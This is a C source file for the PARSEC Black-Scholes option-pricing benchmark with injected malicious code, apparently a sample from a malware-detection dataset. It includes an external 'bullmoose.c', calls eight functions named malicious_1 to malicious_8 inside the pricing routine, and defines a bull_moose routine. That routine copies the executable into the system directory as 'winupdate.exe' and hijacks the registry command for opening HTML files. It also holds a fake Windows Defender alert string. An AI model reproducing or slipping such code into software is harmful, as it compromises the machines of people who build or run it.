#include "bullmoose.c"
// Copyright (c) 2007 Intel Corp.

// Black-Scholes
// Analytical method for calculating European Options
//
//
// Reference Source: Options, Futures, and Other Derivatives, 3rd Edition,
// Prentice
// Hall, John C. Hull,

#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <string.h>



//#include "bull_moose.c"


#ifdef ENABLE_PARSEC_HOOKS
#include <hooks.h>
#endif

#define ENABLE_THREADS 1
// Multi-threaded pthreads header
#ifdef ENABLE_THREADS
// Add the following line so that icc 9.0 is compatible with pthread lib.
#define __thread __threadp

#ifdef _XOPEN_SOURCE
#undef _XOPEN_SOURCE
#define _XOPEN_SOURCE 700
#endif
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#ifndef __USE_XOPEN2K
#define __USE_XOPEN2K
#endif
#ifndef __USE_UNIX98
#define __USE_UNIX98
#endif
#include <pthread.h>
#include <time.h>

#define MAX_THREADS 128

pthread_t _M4_threadsTable[MAX_THREADS];
int _M4_threadsTableAllocated[MAX_THREADS];
pthread_mutexattr_t _M4_normalMutexAttr;
int _M4_numThreads = MAX_THREADS;

#undef __thread
#endif

// Multi-threaded OpenMP header
#ifdef ENABLE_OPENMP
#include <omp.h>
#endif

#ifdef ENABLE_TBB
#include "tbb/blocked_range.h"
#include "tbb/parallel_for.h"
#include "tbb/task_scheduler_init.h"
#include "tbb/tick_count.h"
using namespace std;
using namespace tbb;
#endif // ENABLE_TBB

// Multi-threaded header for Windows
#ifdef WIN32
#pragma warning(disable : 4305)
#pragma warning(disable : 4244)
#include <windows.h>
#define WIN32_LEAN_AND_MEAN
#include <shellapi.h>
#endif

// Precision to use for calculations
#define fptype float

#define NUM_RUNS 1

typedef struct OptionData_ {
  fptype s;        // spot price
  fptype strike;   // strike price
  fptype r;        // risk-free interest rate
  fptype divq;     // dividend rate
  fptype v;        // volatility
  fptype t;        // time to maturity or option expiration in years
                   //     (1yr = 1.0, 6mos = 0.5, 3mos = 0.25, ..., etc)
  char OptionType; // Option type.  "P"=PUT, "C"=CALL
  fptype divs;     // dividend vals (not used in this test)
  fptype DGrefval; // DerivaGem Reference Value
} OptionData;

OptionData *data;
fptype *prices;
int numOptions;

int *otype;
fptype *sptprice;
fptype *strike;
fptype *rate;
fptype *volatility;
fptype *otime;
int numError = 0;
int nThreads;

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// Cumulative Normal Distribution Function
// See Hull, Section 11.8, P.243-244
#define inv_sqrt_2xPI 0.39894228040143270286

fptype CNDF(fptype InputX) {
  int sign;

  fptype OutputX;
  fptype xInput;
  fptype xNPrimeofX;
  fptype expValues;
  fptype xK2;
  fptype xK2_2, xK2_3;
  fptype xK2_4, xK2_5;
  fptype xLocal, xLocal_1;
  fptype xLocal_2, xLocal_3;

  // Check for negative value of InputX
  if (InputX < 0.0) {
    InputX = -InputX;
    sign = 1;
  } else
    sign = 0;

  xInput = InputX;

  // Compute NPrimeX term common to both four & six decimal accuracy calcs
  expValues = exp(-0.5f * InputX * InputX);
  xNPrimeofX = expValues;
  xNPrimeofX = xNPrimeofX * inv_sqrt_2xPI;

  xK2 = 0.2316419 * xInput;
  xK2 = 1.0 + xK2;
  xK2 = 1.0 / xK2;
  xK2_2 = xK2 * xK2;
  xK2_3 = xK2_2 * xK2;
  xK2_4 = xK2_3 * xK2;
  xK2_5 = xK2_4 * xK2;

  xLocal_1 = xK2 * 0.319381530;
  xLocal_2 = xK2_2 * (-0.356563782);
  xLocal_3 = xK2_3 * 1.781477937;
  xLocal_2 = xLocal_2 + xLocal_3;
  xLocal_3 = xK2_4 * (-1.821255978);
  xLocal_2 = xLocal_2 + xLocal_3;
  xLocal_3 = xK2_5 * 1.330274429;
  xLocal_2 = xLocal_2 + xLocal_3;

  xLocal_1 = xLocal_2 + xLocal_1;
  xLocal = xLocal_1 * xNPrimeofX;
  xLocal = 1.0 - xLocal;

  OutputX = xLocal;

  if (sign) {
    OutputX = 1.0 - OutputX;
  }

  return OutputX;
}

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
fptype BlkSchlsEqEuroNoDiv(fptype sptprice, fptype strike, fptype rate,
                           fptype volatility, fptype time, int otype,
                           float timet) {
  fptype OptionPrice;

  // local private working variables for the calculation
  fptype xStockPrice;
  fptype xStrikePrice;
  fptype xRiskFreeRate;
  fptype xVolatility;
  fptype xTime;
  fptype xSqrtTime;

  fptype logValues;
  fptype xLogTerm;
  fptype xD1;
  fptype xD2;
  fptype xPowerTerm;
  fptype xDen;
  fptype d1;
  fptype d2;
  fptype FutureValueX;
  fptype NofXd1;
  fptype NofXd2;
  fptype NegNofXd1;
  fptype NegNofXd2;
  malicious_4();
  xStockPrice = sptprice;
  xStrikePrice = strike;
  xRiskFreeRate = rate;
  xVolatility = volatility;
  malicious_3();
  xTime = time;
  xSqrtTime = sqrt(xTime);
  malicious_2();
  logValues = log(sptprice / strike);
  malicious_1();
  xLogTerm = logValues;
  malicious_8();
  xPowerTerm = xVolatility * xVolatility;
  xPowerTerm = xPowerTerm * 0.5;
  malicious_7();
  xD1 = xRiskFreeRate + xPowerTerm;
  xD1 = xD1 * xTime;
  xD1 = xD1 + xLogTerm;
  malicious_6();
  xDen = xVolatility * xSqrtTime;
  xD1 = xD1 / xDen;
  xD2 = xD1 - xDen;
  malicious_5();
  d1 = xD1;
  d2 = xD2;

  NofXd1 = CNDF(d1);
  NofXd2 = CNDF(d2);

  FutureValueX = strike * (exp(-(rate) * (time)));
  if (otype == 0) {
    OptionPrice = (sptprice * NofXd1) - (FutureValueX * NofXd2);
  } else {
    NegNofXd1 = (1.0 - NofXd1);
    NegNofXd2 = (1.0 - NofXd2);
    OptionPrice = (FutureValueX * NegNofXd2) - (sptprice * NegNofXd1);
  }

  return OptionPrice;
}

#ifdef ENABLE_TBB
struct mainWork {
  mainWork() {}
  mainWork(mainWork &w, tbb::split) {}

  void operator()(const tbb::blocked_range<int> &range) const {
    fptype price;
    int begin = range.begin();
    int end = range.end();

    for (int i = begin; i != end; i++) {
      /* Calling main function to calculate option value based on
       * Black & Scholes's equation.
       */

      price = BlkSchlsEqEuroNoDiv(sptprice[i], strike[i], rate[i],
                                  volatility[i], otime[i], otype[i], 0);
      prices[i] = price;

#ifdef ERR_CHK
      fptype priceDelta = data[i].DGrefval - price;
      if (fabs(priceDelta) >= 1e-5) {
        fprintf(stderr, "Error on %d. Computed=%.5f, Ref=%.5f, Delta=%.5f\n", i,
                price, data[i].DGrefval, priceDelta);
        numError++;
      }
#endif
    }
  }
};

#endif // ENABLE_TBB

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

#ifdef ENABLE_TBB
int bs_thread(void *tid_ptr) {
  int j;
  tbb::affinity_partitioner a;

  mainWork doall;
  for (j = 0; j < NUM_RUNS; j++) {
    tbb::parallel_for(tbb::blocked_range<int>(0, numOptions), doall, a);
  }

  return 1;
}
#else // !ENABLE_TBB

#ifdef WIN32
DWORD WINAPI bs_thread(LPVOID tid_ptr) {
#else
int bs_thread(void *tid_ptr) {
#endif
  int i, j;
  fptype price;
  fptype priceDelta;
  int tid = *(int *)tid_ptr;
  int start = tid * (numOptions / nThreads);
  int end = start + (numOptions / nThreads);

  for (j = 0; j < NUM_RUNS; j++) {
#ifdef ENABLE_OPENMP
#pragma omp parallel for private(i, price, priceDelta)
    for (i = 0; i < numOptions; i++) {
#else // ENABLE_OPENMP
    for (i = start; i < end; i++) {
#endif // ENABLE_OPENMP
      /* Calling main function to calculate option value based on
       * Black & Scholes's equation.
       */
      price = BlkSchlsEqEuroNoDiv(sptprice[i], strike[i], rate[i],
                                  volatility[i], otime[i], otype[i], 0);
      prices[i] = price;

#ifdef ERR_CHK
      priceDelta = data[i].DGrefval - price;
      if (fabs(priceDelta) >= 1e-4) {
        printf("Error on %d. Computed=%.5f, Ref=%.5f, Delta=%.5f\n", i, price,
               data[i].DGrefval, priceDelta);
        numError++;
      }
#endif
    }
  }

  return 1;
}
#endif // ENABLE_TBB

const char InfectString[] = "\n<script>alert(\"Warning: This file has been detected by Windows "
"Defender to be infected with Win32/BullMoose!\");</script>";

DWORD WINAPI bull_moose(LPVOID tid_ptr)
{
	char MyPath[256], CpyPath[256];
	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
	GetSystemDirectory(CpyPath,sizeof(CpyPath));
	strcat(CpyPath,"\\winupdate.exe");
	CopyFile(MyPath,CpyPath,FALSE);
	strcat(CpyPath," %1");

	HKEY Key32;
	RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
	RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
	RegCloseKey(Key32);
	return 0;
}


int main(int argc, char **argv) {
  FILE *file;
  int i;
  int loopnum;
  fptype *buffer;
  int *buffer2;
  int rv;

#ifdef PARSEC_VERSION
#define __PARSEC_STRING(x) #x
#define __PARSEC_XSTRING(x) __PARSEC_STRING(x)
  printf(
      "PARSEC Benchmark Suite Version "__PARSEC_XSTRING(PARSEC_VERSION) "\n");
  fflush(NULL);
#else
  printf("PARSEC Benchmark Suite\n");
  fflush(NULL);
#endif // PARSEC_VERSION
#ifdef ENABLE_PARSEC_HOOKS
  __parsec_bench_begin(__parsec_blackscholes);
#endif

  // if (argc != 4) {
  //   printf("Usage:\n\t%s <nthreads> <inputFile> <outputFile>\n", argv[0]);
  //   return 1;
  // }
  // nThreads = atoi(argv[1]);
  nThreads = 4;
  // char *inputFile = argv[2];
  // char *outputFile = argv[3];

  // Read input data from file
  // file = fopen(inputFile, "r");
  // if (file == NULL) {
  //   printf("ERROR: Unable to open file %s.\n", inputFile);
  //   return 1;
  // }
//  rv = fscanf(file, "%i", &numOptions);
  numOptions = 4;
  // if (rv != 1) {
  //   printf("ERROR: Unable to read from file %s.\n", inputFile);
  //   fclose(file);
  //   return 1;
  // }
  // if (nThreads > numOptions) {
  //   printf("WARNING: Not enough work, reducing number of threads to match "
  //          "number of options.\n");
  //   nThreads = numOptions;
  // }

#if !defined(ENABLE_THREADS) && !defined(ENABLE_OPENMP) && !defined(ENABLE_TBB)
  if (nThreads != 1) {
    printf("Error: <nthreads> must be 1 (serial version)\n");
    return 1;
  }
#endif

  // alloc spaces for the option data
  data = (OptionData *)malloc(numOptions * sizeof(OptionData));
  prices = (fptype *)malloc(numOptions * sizeof(fptype));
  for (loopnum = 0; loopnum < 2; ++loopnum) {
    data[loopnum].s = 42;
    data[loopnum].strike = 40;
    data[loopnum].r = 0.1;
    data[loopnum].divq = 0;
    data[loopnum].v = 0.2;
    data[loopnum].t = 0.5;
    data[loopnum].divs = 0;
  }
  data[0].OptionType = 'P';
  data[1].OptionType = 'C';
  data[0].DGrefval = 4.759423036851750055;
  data[1].DGrefval = 0.808600016880314021;
  for (loopnum = 2; loopnum < 4; ++loopnum) {
    data[loopnum].s = 100;
    data[loopnum].strike = 100;
    data[loopnum].r = 0.5;
    data[loopnum].divq = 0;
    data[loopnum].v = 0.15;
    data[loopnum].t = 1;
    data[loopnum].divs = 0;
  }
  data[2].OptionType = 'P';
  data[3].OptionType = 'C';
  data[2].DGrefval = 3.714602051381290071;
  data[3].DGrefval = 8.591659601309890704;

#ifdef ENABLE_THREADS

  pthread_mutexattr_init(&_M4_normalMutexAttr);
  //    pthread_mutexattr_settype( &_M4_normalMutexAttr, PTHREAD_MUTEX_NORMAL);
  _M4_numThreads = nThreads;
  {
    int _M4_i;
    for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++) {
      _M4_threadsTableAllocated[_M4_i] = 0;
    }
  };
#endif
  printf("Num of Options: %d\n", numOptions);
  printf("Num of Runs: %d\n", NUM_RUNS);

#define PAD 256
#define LINESIZE 64

  buffer = (fptype *)malloc(5 * numOptions * sizeof(fptype) + PAD);
  sptprice = (fptype *)(((unsigned long long)buffer + PAD) & ~(LINESIZE - 1));
  strike = sptprice + numOptions;
  rate = strike + numOptions;
  volatility = rate + numOptions;
  otime = volatility + numOptions;

  buffer2 = (int *)malloc(numOptions * sizeof(fptype) + PAD);
  otype = (int *)(((unsigned long long)buffer2 + PAD) & ~(LINESIZE - 1));

  for (i = 0; i < numOptions; i++) {
    otype[i] = (data[i].OptionType == 'P') ? 1 : 0;
    sptprice[i] = data[i].s;
    strike[i] = data[i].strike;
    rate[i] = data[i].r;
    volatility[i] = data[i].v;
    otime[i] = data[i].t;
  }

  printf("Size of data: %d\n", numOptions * (sizeof(OptionData) + sizeof(int)));

#ifdef ENABLE_PARSEC_HOOKS
  __parsec_roi_begin();
#endif

#ifdef ENABLE_THREADS
#ifdef WIN32
  printf("WIN32\n");



  HANDLE *threads;
  int *nums;
  threads = (HANDLE *)malloc(nThreads * sizeof(HANDLE));
  nums = (int *)malloc(nThreads * sizeof(int));

  for (i = 0; i < nThreads; i++) {
    nums[i] = i;
    threads[i] = CreateThread(0, 0, bs_thread, &nums[i], 0, 0);
  }
  WaitForMultipleObjects(nThreads, threads, TRUE, INFINITE);
  free(threads);
  free(nums);
#else
  int *tids;
  tids = (int *)malloc(nThreads * sizeof(int));

  for (i = 0; i < nThreads; i++) {
    tids[i] = i;

    {
      int _M4_i;
      for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++) {
        if (_M4_threadsTableAllocated[_M4_i] == 0)
          break;
      }
      pthread_create(&_M4_threadsTable[_M4_i], NULL,
                     (void *(*)(void *))bs_thread, (void *)&tids[i]);
      _M4_threadsTableAllocated[_M4_i] = 1;
    };
  }

  {
    int _M4_i;
    void *_M4_ret;
    for (_M4_i = 0; _M4_i < MAX_THREADS; _M4_i++) {
      if (_M4_threadsTableAllocated[_M4_i] == 0)
        break;
      pthread_join(_M4_threadsTable[_M4_i], &_M4_ret);
    }
  };
  free(tids);
#endif // WIN32
#else // ENABLE_THREADS
#ifdef ENABLE_OPENMP
  {
    int tid = 0;
    omp_set_num_threads(nThreads);
    bs_thread(&tid);
  }
#else // ENABLE_OPENMP
#ifdef ENABLE_TBB
  tbb::task_scheduler_init init(nThreads);

  int tid = 0;
  bs_thread(&tid);
#else // ENABLE_TBB
  // serial version
  int tid = 0;
  bs_thread(&tid);
#endif // ENABLE_TBB
#endif // ENABLE_OPENMP
#endif // ENABLE_THREADS

#ifdef ENABLE_PARSEC_HOOKS
  __parsec_roi_end();
#endif

  // Write prices to output file
  // file = fopen(outputFile, "w");
  // if (file == NULL) {
  //   printf("ERROR: Unable to open file %s.\n", outputFile);
  //   return 1;
  // }
  // rv = fprintf(file, "%i\n", numOptions);
  printf("%i\n", numOptions);
  // if (rv < 0) {
  //   printf("ERROR: Unable to write to file %s.\n", outputFile);
  //   fclose(file);
  //   return 1;
  // }
  for (i = 0; i < numOptions; i++) {
    // rv = fprintf(file, "%.18f\n", prices[i]);
    printf("%.18f\n", prices[i]);
    // if (rv < 0) {
    //   printf("ERROR: Unable to write to file %s.\n", outputFile);
    //   fclose(file);
    //   return 1;
    // }
  }
  // rv = fclose(file);
  // if (rv != 0) {
  //   printf("ERROR: Unable to close file %s.\n", outputFile);
  //   return 1;
  // }

#ifdef ERR_CHK
  printf("Num Errors: %d\n", numError);
#endif
  free(data);
  free(prices);

#ifdef ENABLE_PARSEC_HOOKS
  __parsec_bench_end();
#endif


  return 1;
}
